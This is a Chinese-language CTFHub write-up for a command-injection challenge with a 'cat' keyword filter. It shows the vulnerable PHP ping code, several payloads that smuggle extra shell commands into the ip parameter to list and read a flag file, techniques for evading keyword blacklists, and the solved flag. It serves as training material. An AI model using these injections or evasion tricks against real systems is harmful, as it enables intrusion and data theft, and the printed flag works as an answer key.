【CTFHub】Web-RCE 命令注入-过滤cat Writeup

操作者：何芊宏 | 操作日期：2026.9.26 | 分类：CTF | 标签：CTFHub, Web, RCE, 命令注入, 过滤cat, base64读取

1. 题目信息

  • 平台：CTFHub
  • 分类：Web - RCE / 命令注入
  • 题目名称：过滤cat
  • 环境：浏览器 + 输入框提交。
  • 目标：在 cat 命令被正则黑名单过滤的情况下，使用替代命令读取目标文件。

2. 解题思路与知识点

本关核心考点：命令注入黑名单绕过，以及 Web 环境下读取 PHP 源码的特殊处理。

知识点（比喻说明）：
  • 黑名单绕过： 服务器使用正则表达式 preg_match_all("/cat/", ...) 拦截了 cat 关键字。就像门口的保安不让叫“cat”的人进。我们可以派一个叫“tac”或“base64”的双胞胎兄弟进去，或者用易容术（如 ca?、c'a't）把 cat 伪装起来。
  • Web 环境下的源码读取： 当文件内容包含 <?php // flag... ?> 时，如果直接用 cat 或 tac 读取，返回的 HTML 会被浏览器解析隐藏，导致回显为空。最佳做法是使用 base64 命令进行强制编码，得到纯文本字符串后再在本地解码。

3. 详细步骤

第一步：源码审计与漏洞定位

<?php
if (isset($_GET['ip']) && $_GET['ip']) {
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/cat/", $ip, $m)) {
        $cmd = "ping -c 4 {$ip}";
        exec($cmd, $res);
    } else {
        $res = $m;
    }
}
?>

代码逐行解析：

  • preg_match_all("/cat/", $ip, $m)：如果参数 ip 里包含连续的 cat 字符串，则拦截并打印匹配结果。
  • 命令注入逻辑与之前相同，只是在拼接执行前增加了一道关键字检查。

第二步：探测目标文件

Payload： 127.0.0.1; ls -la

回显结果：发现目标文件 flag_1323198513494.php，文件大小 42 字节。

第三步：尝试 tac 绕过（排错过程）

Payload： 127.0.0.1; tac flag_1323198513494.php

操作解析： tac 是 cat 的反写，不包含 cat 字符串，可以成功绕过正则检测。

回显结果：数组 [9] 处为空（[9] =>）。推测是因为文件内容为 <?php // ctfhub{...}，被 PHP 解析器或 HTML 渲染器“吃掉”了。

第四步：使用 base64 强制读取并解码 Flag

Payload： 127.0.0.1; base64 flag_1323198513494.php

回显结果：得到 Base64 字符串 PD9waHAgLy8gY3RmaHViezZhNWFkYzQyNjhhYjEyNGRmMTkwYjRkMX0K

操作： 将字符串复制到在线工具 https://base64.us 进行解码。

解码结果：<?php // ctfhub{6a5adc4269ab124df190b4d1}

4. 踩坑记录与复盘（逻辑推导）

  • 黑名单只过滤了字面量： 正则 /cat/ 只能匹配连续的 "cat" 字符串。使用 tac 或 base64 即可轻松绕过。
  • Web 渲染干扰： 单纯使用 tac 读取 PHP 源码会得到一片空白（因为 PHP 标签和 HTML 语法会被解析）。必须牢记使用 base64 强制转码。

5. 知识总结

  • 读文件命令替代库： 当 cat 被禁用时，可选择 tac、nl、more、less、head、tail、sort、base64、xxd 等。
  • Web 环境读源码的最佳实践： 优先使用 base64 编码读取，再本地解码，可以完美解决一切 HTML 标签和 PHP 代码解析带来的视觉干扰。
